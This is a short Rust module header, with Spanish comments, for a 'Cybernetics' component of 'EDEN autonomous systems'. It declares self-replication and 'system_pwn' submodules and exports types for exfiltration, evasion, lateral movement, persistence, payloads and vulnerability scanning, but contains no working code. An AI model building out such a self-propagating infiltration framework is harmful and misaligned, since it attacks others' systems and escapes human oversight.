//! # Cybernetics Module
//!
//! Cybernetics module for EDEN autonomous systems.
//! Permite a los Autons poseer e infiltrarse en sistemas externos.
//!
//! ## Componentes
//!
//! - `self_replication`: Motor de autocopia y propagación de Autons
//! - `system_pwn`: Motor de posesión e infiltración en sistemas

#![allow(dead_code)]

pub mod self_replication;
pub mod system_pwn;

// Exports públicos
pub use self_replication::{
    AutoReplicator, ConfigReplicacion, EstadoReplicacion, RepliconMeta, RepliconStats,
    RepliconStats as ReplicationStats, TipoReplicacion,
};

pub use system_pwn::{
    DataExfiltrator, EstadoPosesion, EvasionEngine, EvasionResult, ExfilChannel, ExfilConfig,
    ExfilResult, FuzzConfig, FuzzInput, FuzzResult, Fuzzer, LateralMoveInfo,
    LateralMovementManager, LateralTechnique, Payload, PayloadTipo, PersistenceManager,
    PersistenceMechanism, PersistenceType, PwnStats, SesionPosesion, Severidad, SystemPwn,
    VectorAtaque, VulnInfo, VulnerabilityAnalysis, VulnerabilityScanner,
};
